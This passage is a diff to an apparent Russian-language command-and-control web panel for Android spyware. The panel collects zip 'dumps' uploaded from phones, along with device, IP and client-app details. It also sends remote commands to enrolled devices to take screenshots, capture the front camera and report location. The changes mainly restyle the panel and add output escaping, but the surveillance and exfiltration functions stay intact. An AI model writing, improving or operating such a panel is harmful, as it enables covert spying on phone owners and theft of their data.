@@ -53,6 +53,34 @@ function writeDevices(o) { writeJSON(DEVICES_FILE, o); }
 function readCmds() { return readJSON(CMDS_FILE, {}); }
 function writeCmds(o) { writeJSON(CMDS_FILE, o); }
 
+function esc(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
+function fmtSize(bytes) {
+  if (!bytes) return '0 B';
+  const u = ['B', 'KB', 'MB', 'GB'];
+  let i = 0, v = bytes;
+  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
+  return v.toFixed(i === 0 ? 0 : 2) + ' ' + u[i];
+}
+
+function fmtTime(ts) {
+  const d = new Date(ts);
+  const p = n => String(n).padStart(2, '0');
+  return `${p(d.getDate())}.${p(d.getMonth() + 1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
+}
+
+function ago(ts) {
+  const s = Math.floor((Date.now() - ts) / 1000);
+  if (s < 60) return s + 's';
+  if (s < 3600) return Math.floor(s / 60) + 'm';
+  if (s < 86400) return Math.floor(s / 3600) + 'h';
+  return Math.floor(s / 86400) + 'd';
+}
+
 app.post('/upload', upload.single('file'), (req, res) => {
   const key = req.headers['x-key'] || req.query.key;
   if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
@@ -202,11 +230,19 @@ app.get('/cmd/send', (req, res) => {
   res.redirect('/?key=' + VIEW_KEY + '&tab=control&device=' + encodeURIComponent(deviceId));
 });
 
+const NAV = [
+  { id: 'dumps', label: 'Дампы' },
+  { id: 'control', label: 'Управление' },
+  { id: 'logs', label: 'Логи' },
+  { id: 'uploadlog', label: 'Upload' }
+];
+
 app.get('/', (req, res) => {
   if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
 
   const tab = req.query.tab || 'dumps';
   const selectedDevice = req.query.device || null;
+  const k = encodeURIComponent(VIEW_KEY);
 
   const files = fs.readdirSync(SAVE_DIR)
     .filter(f => f.endsWith('.zip'))
@@ -225,232 +261,351 @@ app.get('/', (req, res) => {
   const logs = readLogs().slice().reverse();
   const uploadLogs = readUploadLogs().slice().reverse();
   const devices = readDevices();
+  const deviceList = Object.values(devices).sort((a, b) => b.lastSeen - a.lastSeen);
+  const onlineCount = deviceList.filter(d => (Date.now() - d.lastSeen) < 60000).length;
 
-  const dumpCards = files.map((f, i) => `
-    <div class="card" style="animation-delay:${Math.min(i * 30, 600)}ms">
-      <div class="card-head">
-        <div class="dot"></div>
-        <div class="device">${f.device}</div>
-        <div class="time">${new Date(f.ts).toLocaleString('ru-RU')}</div>
-      </div>
-      <div class="card-body">
-        <div class="row"><span>Android</span><b>${f.android}</b></div>
-        <div class="row"><span>Размер</span><b>${(f.size/1024/1024).toFixed(2)} MB</b></div>
-        <div class="row"><span>IP</span><b>${f.ip}</b></div>
-      </div>
-      <div class="actions">
-        <a class="btn" href="/download/${f.filename}?key=${VIEW_KEY}">Скачать</a>
-        <a class="btn-del" href="/delete/${f.filename}?key=${VIEW_KEY}" onclick="return confirm('Удалить дамп?')">Удалить</a>
-      </div>
-    </div>`).join('');
+  // ── dumps ──
+  const dumpRows = files.map(f => `
+    <tr>
+      <td class="mono">${esc(f.device)}</td>
+      <td>${esc(f.android)}</td>
+      <td class="mono dim">${esc(f.ip)}</td>
+      <td class="num">${fmtSize(f.size)}</td>
+      <td class="mono dim">${fmtTime(f.ts)}</td>
+      <td class="right">
+        <a class="btn" href="/download/${encodeURIComponent(f.filename)}?key=${k}">Скачать</a>
+        <a class="btn danger" href="/delete/${encodeURIComponent(f.filename)}?key=${k}" onclick="return confirm('Удалить дамп?')">Удалить</a>
+      </td>
+    </tr>`).join('');
 
+  // ── logs ──
   const logRows = logs.map(l => {
     if (l.type === 'cmd_result') {
       return `
-      <div class="log-row">
-        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
-        <div class="log-main">
-          <div class="log-device">Команда <b>${l.cmd}</b></div>
-          <div class="log-meta">
-            <span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span>
-            ${l.note ? `<span class="tag">${l.note}</span>` : ''}
-          </div>
-          ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:300px;border-radius:8px;margin-top:6px"/></div>` : ''}
-          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn-mini" href="${l.file}" target="_blank">открыть файл</a></div>` : ''}
-        </div>
-      </div>`;
+      <tr>
+        <td class="mono dim">${fmtTime(l.ts)}</td>
+        <td><span class="tag">cmd</span> ${esc(l.cmd)}</td>
+        <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
+        <td class="note">
+          ${l.note ? esc(l.note) : '—'}
+          ${l.file && l.fileType && l.fileType.includes('image') ? `<div class="thumb"><img src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>` : ''}
+          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn mini" href="${esc(l.file)}" target="_blank">файл</a></div>` : ''}
+        </td>
+        <td class="mono dim right">${esc(l.ip)}</td>
+      </tr>`;
     }
     return `
-      <div class="log-row">
-        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
-        <div class="log-main">
-          <div class="log-device">${l.device} <span class="log-android">Android ${l.android} (SDK ${l.sdk})</span></div>
-          <div class="log-meta">
-            ${l.clients && l.clients.length ? `<span class="tag">${l.clients.join(' · ')}</span>` : ''}
-            ${l.zipSize ? `<span class="tag">${(l.zipSize/1024/1024).toFixed(2)} MB</span>` : ''}
-            ${l.ok ? `<span class="ok">✓ sent</span>` : `<span class="bad">✗ fail</span>`}
-          </div>
-          ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
-        </div>
-        <div class="log-ip">${l.ip}</div>
-      </div>`;
+      <tr>
+        <td class="mono dim">${fmtTime(l.ts)}</td>
+        <td class="mono">${esc(l.device)}</td>
+        <td class="dim">Android ${esc(l.android)} / ${esc(l.sdk)}</td>
+        <td class="note">
+          ${l.clients && l.clients.length ? `<span class="tag">${esc(l.clients.join(' · '))}</span> ` : ''}
+          ${l.zipSize ? `<span class="tag">${fmtSize(l.zipSize)}</span> ` : ''}
+          <span class="pill ${l.ok ? 'on' : 'off'}">${l.ok ? 'sent' : 'fail'}</span>
+          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
+        </td>
+        <td class="mono dim right">${esc(l.ip)}</td>
+      </tr>`;
   }).join('');
 
+  // ── upload log ──
   const uploadRows = uploadLogs.map(l => {
-    const stageClass = l.stage === 'done' ? 'ok' : l.stage === 'fail' ? 'bad' : 'tag';
     const progress = l.totalBytes > 0 ? ((l.sentBytes / l.totalBytes) * 100).toFixed(1) : '0';
     return `
-      <div class="log-row">
-        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
-        <div class="log-main">
-          <div class="log-device">${l.device} <span class="log-android">${l.filename}</span></div>
-          <div class="log-meta">
-            <span class="${stageClass}">${l.stage}</span>
-            ${l.totalChunks ? `<span>chunk ${l.chunk}/${l.totalChunks}</span>` : ''}
-            ${l.totalBytes ? `<span>${(l.sentBytes/1024/1024).toFixed(2)} / ${(l.totalBytes/1024/1024).toFixed(2)} MB (${progress}%)</span>` : ''}
-          </div>
-          ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
-        </div>
-        <div class="log-ip">${l.ip}</div>
-      </div>`;
+      <tr>
+        <td class="mono dim">${fmtTime(l.ts)}</td>
+        <td class="mono">${esc(l.device)}</td>
+        <td class="mono dim">${esc(l.filename)}</td>
+        <td>
+          <span class="pill ${l.stage === 'done' ? 'on' : l.stage === 'fail' ? 'off' : ''}">${esc(l.stage)}</span>
+          ${l.totalChunks ? `<span class="tag">chunk ${l.chunk}/${l.totalChunks}</span>` : ''}
+          ${l.totalBytes ? `<span class="tag">${fmtSize(l.sentBytes)} / ${fmtSize(l.totalBytes)} · ${progress}%</span>` : ''}
+          ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
+        </td>
+        <td class="mono dim right">${esc(l.ip)}</td>
+      </tr>`;
   }).join('');
 
-  const deviceList = Object.values(devices).sort((a,b) => b.lastSeen - a.lastSeen);
-
+  // ── control ──
   let controlHtml = '';
   if (!selectedDevice) {
     controlHtml = deviceList.length === 0
-      ? '<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>'
-      : '<div class="grid">' + deviceList.map(d => {
+      ? `<div class="empty"><div class="empty-mark">∅</div><div>Устройств пока нет</div></div>`
+      : `<div class="grid">` + deviceList.map(d => {
           const online = (Date.now() - d.lastSeen) < 60000;
           return `
-          <a class="card" href="/?key=${VIEW_KEY}&tab=control&device=${encodeURIComponent(d.deviceId)}" style="text-decoration:none;color:inherit">
-            <div class="card-head">
-              <div class="dot ${online ? '' : 'off'}"></div>
-              <div class="device">${d.device}</div>
-              <div class="time">${new Date(d.lastSeen).toLocaleString('ru-RU')}</div>
+          <a class="card" href="/?key=${k}&tab=control&device=${encodeURIComponent(d.deviceId)}">
+            <div class="card-top">
+              <span class="dot ${online ? 'on' : ''}"></span>
+              <span class="card-title">${esc(d.device)}</span>
+              <span class="card-ago mono">${ago(d.lastSeen)}</span>
             </div>
-            <div class="card-body">
-              <div class="row"><span>Android</span><b>${d.android} / SDK ${d.sdk}</b></div>
-              <div class="row"><span>IP</span><b>${d.ip}</b></div>
-              <div class="row"><span>Клиенты</span><b>${(d.clients||[]).join(', ') || '—'}</b></div>
-            </div>
+            <div class="kv"><span>ID</span><b class="mono">${esc(d.deviceId)}</b></div>
+            <div class="kv"><span>Android</span><b>${esc(d.android)} / ${esc(d.sdk)}</b></div>
+            <div class="kv"><span>IP</span><b class="mono">${esc(d.ip)}</b></div>
+            <div class="kv"><span>Клиенты</span><b>${esc((d.clients || []).join(', ') || '—')}</b></div>
           </a>`;
-        }).join('') + '</div>';
+        }).join('') + `</div>`;
   } else {
     const dev = devices[selectedDevice];
     if (!dev) {
-      controlHtml = '<div class="empty"><div class="empty-icon">❓</div><div>Устройство не найдено</div></div>';
+      controlHtml = `<div class="empty"><div class="empty-mark">?</div><div>Устройство не найдено</div></div>`;
     } else {
-      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 30);
+      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 50);
+      const q = `key=${k}&device=${encodeURIComponent(selectedDevice)}`;
       controlHtml = `
-        <div class="dev-header">
-          <a href="/?key=${VIEW_KEY}&tab=control" class="back">← Назад</a>
-          <div class="dev-title">${dev.device}</div>
-          <div class="dev-sub">${dev.ip} · Android ${dev.android}</div>
+        <a class="back" href="/?key=${k}&tab=control">← Все устройства</a>
+        <div class="dev-head">
+          <div>
+            <div class="dev-name">${esc(dev.device)}</div>
+            <div class="dev-sub mono">${esc(dev.ip)} · Android ${esc(dev.android)} · ${esc(dev.deviceId)}</div>
+          </div>
+          <span class="pill ${(Date.now() - dev.lastSeen) < 60000 ? 'on' : 'off'}">${(Date.now() - dev.lastSeen) < 60000 ? 'online' : 'seen ' + ago(dev.lastSeen) + ' ago'}</span>
         </div>
         <div class="cmd-grid">
-          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=screenshot">📸 Скриншот</a>
-          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=frontcam">🤳 Фронталка</a>
-          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=location">📍 Гео</a>
+          <a class="cmd" href="/cmd/send?${q}&cmd=screenshot"><span>01</span>Скриншот</a>
+          <a class="cmd" href="/cmd/send?${q}&cmd=frontcam"><span>02</span>Фронталка</a>
+          <a class="cmd" href="/cmd/send?${q}&cmd=location"><span>03</span>Гео</a>
         </div>
-        <h3 style="margin-top:24px;margin-bottom:12px;color:#8b949e;font-size:14px">Результаты</h3>
-        <div class="logs">
-          ${devLogs.length === 0 ? '<div class="log-note">Пока ничего</div>' : devLogs.map(l => `
-            <div class="log-row">
-              <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
-              <div class="log-main">
-                <div class="log-device"><b>${l.cmd}</b></div>
-                <div class="log-meta"><span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span></div>
-                ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:400px;border-radius:8px;margin-top:6px" onclick="window.open('${l.file}','_blank')"/></div>` : ''}
-                ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
-              </div>
-            </div>`).join('')}
-        </div>`;
+        <div class="section-title">Результаты</div>
+        ${devLogs.length === 0 ? `<div class="empty small">Пока ничего</div>` : `
+        <div class="table-wrap"><table>
+          <thead><tr><th>Время</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead>
+          <tbody>${devLogs.map(l => `
+            <tr>
+              <td class="mono dim">${fmtTime(l.ts)}</td>
+              <td class="mono">${esc(l.cmd)}</td>
+              <td><span class="pill ${l.status === 'ok' ? 'on' : 'off'}">${esc(l.status)}</span></td>
+              <td class="note">
+                ${l.file && l.fileType && l.fileType.includes('image') ? `<div class="thumb"><img src="${esc(l.file)}" onclick="window.open('${esc(l.file)}','_blank')"/></div>` : ''}
+                ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<a class="btn mini" href="${esc(l.file)}" target="_blank">открыть</a>` : ''}
+                ${l.note ? `<div class="sub">${esc(l.note)}</div>` : ''}
+              </td>
+            </tr>`).join('')}
+          </tbody>
+        </table></div>`}`;
     }
+  }
+
+  const counts = {
+    dumps: files.length,
+    control: deviceList.length,
+    logs: logs.length,
+    uploadlog: uploadLogs.length
+  };
+
+  const navHtml = NAV.map(n => `
+    <a class="nav ${tab === n.id ? 'active' : ''}" href="/?key=${k}&tab=${n.id}">
+      <span>${n.label}</span><span class="nav-count mono">${counts[n.id]}</span>
+    </a>`).join('');
+
+  const titles = { dumps: 'Дампы', control: 'Управление', logs: 'Логи', uploadlog: 'Upload Log' };
+  const clearLink =
+    tab === 'dumps' ? `<a class="btn danger" href="/clear?key=${k}" onclick="return confirm('Удалить ВСЕ дампы?')">Очистить всё</a>` :
+    tab === 'logs' ? `<a class="btn danger" href="/clearlogs?key=${k}" onclick="return confirm('Удалить все логи?')">Очистить всё</a>` :
+    tab === 'uploadlog' ? `<a class="btn danger" href="/clearuploadlogs?key=${k}" onclick="return confirm('Удалить upload-логи?')">Очистить всё</a>` : '';
+
+  let body = '';
+  if (tab === 'uploadlog') {
+    body = uploadLogs.length === 0
+      ? `<div class="empty"><div class="empty-mark">∅</div><div>Upload-логов пока нет</div></div>`
+      : `<div class="table-wrap"><table>
+          <thead><tr><th>Время</th><th>Устройство</th><th>Файл</th><th>Статус</th><th class="right">IP</th></tr></thead>
+          <tbody>${uploadRows}</tbody>
+        </table></div>`;
+  } else if (tab === 'logs') {
+    body = logs.length === 0
+      ? `<div class="empty"><div class="empty-mark">∅</div><div>Логов пока нет</div></div>`
+      : `<div class="table-wrap"><table>
+          <thead><tr><th>Время</th><th>Устройство</th><th>Система</th><th>Детали</th><th class="right">IP</th></tr></thead>
+          <tbody>${logRows}</tbody>
+        </table></div>`;
+  } else if (tab === 'control') {
+    body = controlHtml;
+  } else {
+    body = files.length === 0
+      ? `<div class="empty"><div class="empty-mark">∅</div><div>Дампов пока нет</div></div>`
+      : `<div class="table-wrap"><table>
+          <thead><tr><th>Устройство</th><th>Android</th><th>IP</th><th>Размер</th><th>Время</th><th class="right"></th></tr></thead>
+          <tbody>${dumpRows}</tbody>
+        </table></div>`;
   }
 
   const html = `<!doctype html>
 <html lang="ru"><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Panel</title>
+<title>Panel — ${titles[tab] || ''}</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:radial-gradient(ellipse at top,#1a1f2e 0%,#0a0d14 60%);color:#e6edf3;min-height:100vh;padding:24px 16px 80px}
-.header{max-width:1200px;margin:0 auto 22px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
-.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:700}
-.logo-icon{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,#58a6ff,#a371f7);display:grid;place-items:center;font-size:20px;box-shadow:0 0 28px rgba(88,166,255,.45)}
-.stats{display:flex;gap:10px;flex-wrap:wrap}
-.stat{padding:8px 14px;border-radius:20px;background:rgba(88,166,255,.1);color:#58a6ff;border:1px solid rgba(88,166,255,.22);font-weight:600;font-size:13px}
-.stat.warn{background:rgba(248,81,73,.1);color:#f85149;border-color:rgba(248,81,73,.22)}
-.tabs{max-width:1200px;margin:0 auto 20px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-.tab{padding:10px 18px;border-radius:10px;text-decoration:none;font-weight:600;font-size:14px;background:#161b22;border:1px solid #21262d;color:#8b949e;transition:all .2s}
-.tab:hover{border-color:#58a6ff;color:#58a6ff}
-.tab.active{background:rgba(88,166,255,.14);color:#58a6ff;border-color:rgba(88,166,255,.3)}
-.spacer{flex:1}
-.tool{padding:10px 16px;border-radius:10px;text-decoration:none;font-weight:600;font-size:13px;background:#161b22;border:1px solid #21262d;color:#f85149;transition:all .2s;cursor:pointer}
-.tool:hover{border-color:#f85149}
-.grid,.logs{max-width:1200px;margin:0 auto;display:flex;flex-direction:column;gap:14px}
-.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
-.empty{max-width:1200px;margin:0 auto;text-align:center;padding:100px 20px;color:#6e7681}
-.empty-icon{font-size:64px;margin-bottom:18px;opacity:.4}
-.card,.log-row{background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;border-radius:14px;padding:16px;transition:all .25s;display:block}
-.card:hover,.log-row:hover{border-color:#58a6ff}
-.card-head{display:flex;align-items:center;gap:8px;padding-bottom:12px;border-bottom:1px solid #21262d;margin-bottom:12px}
-.dot{width:8px;height:8px;border-radius:50%;background:#3fb950;box-shadow:0 0 8px #3fb950;flex-shrink:0}
-.dot.off{background:#6e7681;box-shadow:none}
-.device{font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.time{font-size:11px;color:#6e7681;flex-shrink:0}
-.card-body{display:flex;flex-direction:column;gap:8px}
-.row{display:flex;justify-content:space-between;font-size:13px}
-.row span{color:#6e7681}
-.row b{color:#e6edf3;font-weight:500;word-break:break-all;text-align:right;max-width:60%}
-.actions{display:flex;gap:8px;margin-top:14px}
-.btn,.btn-del{flex:1;text-align:center;padding:10px;border-radius:9px;text-decoration:none;font-weight:600;font-size:13px;transition:all .2s}
-.btn{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
-.btn:hover{filter:brightness(1.15)}
-.btn-del{background:rgba(248,81,73,.12);color:#f85149;border:1px solid rgba(248,81,73,.25)}
-.log-row{display:flex;gap:14px;align-items:center;padding:14px 16px}
-.log-time{font-size:11px;color:#6e7681;min-width:135px}
-.log-main{flex:1;display:flex;flex-direction:column;gap:5px}
-.log-device{font-weight:600;font-size:14px;word-break:break-all}
-.log-android{color:#6e7681;font-weight:400;font-size:12px;margin-left:6px}
-.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:12px}
-.log-meta span{padding:2px 8px;border-radius:10px;background:#161b22;border:1px solid #21262d}
-.log-meta .ok{color:#3fb950;border-color:rgba(63,185,80,.3)}
-.log-meta .bad{color:#f85149;border-color:rgba(248,81,73,.3)}
-.log-meta .tag{color:#58a6ff}
-.log-note{font-size:12px;color:#8b949e;font-style:italic}
-.log-ip{font-size:12px;color:#6e7681;font-family:monospace}
-.dev-header{max-width:1200px;margin:0 auto 20px}
-.back{color:#58a6ff;text-decoration:none;font-size:14px;font-weight:600}
-.dev-title{font-size:22px;font-weight:700;margin-top:10px}
-.dev-sub{color:#6e7681;font-size:13px;margin-top:4px}
-.cmd-grid{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
-.cmd-btn{padding:18px;border-radius:12px;text-decoration:none;color:#e6edf3;font-weight:600;font-size:15px;background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;text-align:center;transition:all .2s}
-.cmd-btn:hover{border-color:#58a6ff;background:rgba(88,166,255,.08);transform:translateY(-2px)}
-.btn-mini{display:inline-block;padding:4px 10px;border-radius:6px;background:rgba(88,166,255,.14);color:#58a6ff;text-decoration:none;font-size:11px;font-weight:600;margin-top:6px}
-</style></head><body>
-
-<div class="header">
-  <div class="logo">
-    <div class="logo-icon">⚡</div>
-    <div>Panel</div>
-  </div>
-  <div class="stats">
-    <div class="stat">${files.length} дампов</div>
-    <div class="stat ${totalSize > 500*1024*1024 ? 'warn' : ''}">${(totalSize/1024/1024).toFixed(1)} MB</div>
-    <div class="stat">${deviceList.length} устройств</div>
-  </div>
-</div>
-
-<div class="tabs">
-  <a class="tab ${tab === 'dumps' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=dumps">Дампы</a>
-  <a class="tab ${tab === 'control' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=control">Управление</a>
-  <a class="tab ${tab === 'logs' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=logs">Логи</a>
-  <a class="tab ${tab === 'uploadlog' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=uploadlog">Upload Log</a>
-  <div class="spacer"></div>
-  ${tab === 'dumps' ? '<a class="tool" href="/clear?key=' + VIEW_KEY + '" onclick="return confirm(\'Удалить ВСЕ дампы?\')">Очистить</a>' : ''}
-  ${tab === 'logs' ? '<a class="tool" href="/clearlogs?key=' + VIEW_KEY + '" onclick="return confirm(\'Удалить все логи?\')">Очистить</a>' : ''}
-  ${tab === 'uploadlog' ? '<a class="tool" href="/clearuploadlogs?key=' + VIEW_KEY + '" onclick="return confirm(\'Удалить upload-логи?\')">Очистить</a>' : ''}
-</div>
-
-${tab === 'uploadlog' 
-  ? (uploadLogs.length === 0 
-      ? '<div class="empty"><div class="empty-icon">📤</div><div>Upload-логов пока нет</div></div>' 
-      : '<div class="logs">' + uploadRows + '</div>')
-  : tab === 'logs'
-  ? (logs.length === 0 
-      ? '<div class="empty"><div class="empty-icon">📋</div><div>Логов пока нет</div></div>' 
-      : '<div class="logs">' + logRows + '</div>')
-  : tab === 'control'
-  ? controlHtml
-  : (files.length === 0 
-      ? '<div class="empty"><div class="empty-icon">📭</div><div>Пока пусто</div></div>' 
-      : '<div class="grid">' + dumpCards + '</div>')
+:root{
+  --bg:#0b0b0b; --bg-2:#101010; --panel:#141414; --line:#242424; --line-2:#333;
+  --fg:#ededed; --fg-2:#9a9a9a; --fg-3:#666; --white:#fff;
 }
+html,body{height:100%}
+body{
+  background:var(--bg); color:var(--fg);
+  font:14px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,system-ui,sans-serif;
+  -webkit-font-smoothing:antialiased;
+}
+.mono{font-family:ui-monospace,SFMono-Regular,'JetBrains Mono',Menlo,Consolas,monospace;font-size:12.5px}
+.dim{color:var(--fg-2)}
+.num{font-variant-numeric:tabular-nums}
+a{color:inherit;text-decoration:none}
 
+.shell{display:flex;min-height:100vh}
+
+/* sidebar */
+.sidebar{
+  width:236px;flex-shrink:0;border-right:1px solid var(--line);
+  background:var(--bg-2);display:flex;flex-direction:column;
+  position:sticky;top:0;height:100vh;
+}
+.brand{display:flex;align-items:center;gap:10px;padding:22px 20px 20px;border-bottom:1px solid var(--line)}
+.mark{width:26px;height:26px;display:grid;place-items:center;border:1px solid var(--line-2);border-radius:6px;font-size:13px;color:var(--white)}
+.brand-name{font-weight:700;letter-spacing:.16em;font-size:12px;color:var(--white)}
+.nav-wrap{padding:14px 12px;display:flex;flex-direction:column;gap:2px}
+.nav{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:9px 12px;border-radius:6px;color:var(--fg-2);
+  font-size:13px;font-weight:500;transition:background .12s,color .12s;
+}
+.nav:hover{background:#191919;color:var(--fg)}
+.nav.active{background:var(--white);color:#0b0b0b;font-weight:600}
+.nav.active .nav-count{color:#0b0b0b;border-color:rgba(0,0,0,.2)}
+.nav-count{font-size:11px;padding:1px 7px;border:1px solid var(--line);border-radius:99px;color:var(--fg-3)}
+.side-foot{margin-top:auto;padding:16px 20px;border-top:1px solid var(--line);font-size:11px;color:var(--fg-3);letter-spacing:.06em}
+.side-foot b{color:var(--fg-2);font-weight:600}
+
+/* main */
+.main{flex:1;min-width:0;display:flex;flex-direction:column}
+.topbar{
+  display:flex;align-items:flex-end;justify-content:space-between;gap:20px;
+  padding:26px 32px 22px;border-bottom:1px solid var(--line);
+  position:sticky;top:0;background:rgba(11,11,11,.88);backdrop-filter:blur(8px);z-index:5;
+}
+.page-title{font-size:22px;font-weight:700;letter-spacing:-.02em;color:var(--white)}
+.page-sub{margin-top:3px;font-size:12px;color:var(--fg-3);letter-spacing:.04em}
+.stats{display:flex;gap:24px;flex-wrap:wrap}
+.stat{text-align:right}
+.stat-val{font-size:17px;font-weight:600;color:var(--white);font-variant-numeric:tabular-nums}
+.stat-key{font-size:10.5px;color:var(--fg-3);letter-spacing:.12em;text-transform:uppercase}
+.content{padding:26px 32px 60px;flex:1}
+
+/* buttons */
+.btn{
+  display:inline-flex;align-items:center;justify-content:center;
+  padding:7px 13px;border:1px solid var(--line-2);border-radius:5px;
+  font-size:12px;font-weight:600;color:var(--fg);background:transparent;
+  transition:all .12s;white-space:nowrap;cursor:pointer;
+}
+.btn:hover{background:var(--white);color:#0b0b0b;border-color:var(--white)}
+.btn.danger:hover{background:#fff;color:#0b0b0b}
+.btn.mini{padding:3px 9px;font-size:11px}
+
+/* table */
+.table-wrap{border:1px solid var(--line);border-radius:8px;overflow:hidden;background:var(--panel)}
+table{width:100%;border-collapse:collapse}
+thead th{
+  text-align:left;padding:11px 16px;font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
+  color:var(--fg-3);font-weight:600;background:#0e0e0e;border-bottom:1px solid var(--line);
+}
+tbody td{padding:13px 16px;border-bottom:1px solid #1a1a1a;vertical-align:middle}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover{background:#161616}
+td.right,th.right{text-align:right}
+td.right .btn+.btn{margin-left:6px}
+.note{max-width:520px}
+.sub{margin-top:5px;font-size:12px;color:var(--fg-2)}
+.thumb{margin-top:8px}
+.thumb img{max-width:300px;border-radius:5px;border:1px solid var(--line-2);cursor:zoom-in;display:block}
+
+/* pills */
+.pill{display:inline-block;padding:2px 8px;border-radius:99px;font-size:10.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--line-2);color:var(--fg-2)}
+.pill.on{background:var(--white);color:#0b0b0b;border-color:var(--white)}
+.pill.off{color:#f0f0f0;border-color:#4a4a4a;background:#1d1d1d}
+.tag{display:inline-block;padding:2px 7px;border:1px solid var(--line);border-radius:4px;font-size:11px;color:var(--fg-2);margin-right:4px;font-family:ui-monospace,Menlo,Consolas,monospace}
+
+/* empty */
+.empty{padding:80px 20px;text-align:center;color:var(--fg-3);font-size:13px}
+.empty.small{padding:32px 20px}
+.empty-mark{font-size:34px;color:var(--line-2);margin-bottom:12px}
+
+/* device grid */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
+.card{
+  display:block;padding:16px 18px;border:1px solid var(--line);border-radius:8px;
+  background:var(--panel);transition:border-color .15s,background .15s;
+}
+.card:hover{border-color:var(--line-2);background:#181818}
+.card-top{display:flex;align-items:center;gap:9px;padding-bottom:12px;margin-bottom:12px;border-bottom:1px solid var(--line)}
+.card-title{font-weight:600;font-size:13.5px;color:var(--white);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.card-ago{font-size:11px;color:var(--fg-3)}
+.dot{width:7px;height:7px;border-radius:50%;background:#3a3a3a;flex-shrink:0}
+.dot.on{background:var(--white);box-shadow:0 0 8px rgba(255,255,255,.7)}
+.kv{display:flex;justify-content:space-between;gap:12px;font-size:12.5px;padding:3px 0}
+.kv span{color:var(--fg-3);flex-shrink:0}
+.kv b{font-weight:500;color:var(--fg);text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+
+/* device detail */
+.back{font-size:12.5px;color:var(--fg-2);font-weight:600}
+.back:hover{color:var(--white)}
+.dev-head{display:flex;align-items:center;justify-content:space-between;gap:16px;margin:16px 0 22px;flex-wrap:wrap}
+.dev-name{font-size:20px;font-weight:700;color:var(--white);letter-spacing:-.01em}
+.dev-sub{margin-top:4px;color:var(--fg-3)}
+.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px;margin-bottom:28px}
+.cmd{
+  border:1px solid var(--line);border-radius:8px;padding:16px;background:var(--panel);
+  font-weight:600;font-size:13.5px;color:var(--fg);transition:all .14s;display:flex;flex-direction:column;gap:8px;
+}
+.cmd span{font-size:10.5px;color:var(--fg-3);letter-spacing:.12em;font-family:ui-monospace,Menlo,Consolas,monospace}
+.cmd:hover{border-color:var(--white);background:#181818;color:var(--white);transform:translateY(-1px)}
+.section-title{font-size:10.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--fg-3);font-weight:600;margin-bottom:12px}
+
+/* mobile */
+@media(max-width:860px){
+  .shell{flex-direction:column}
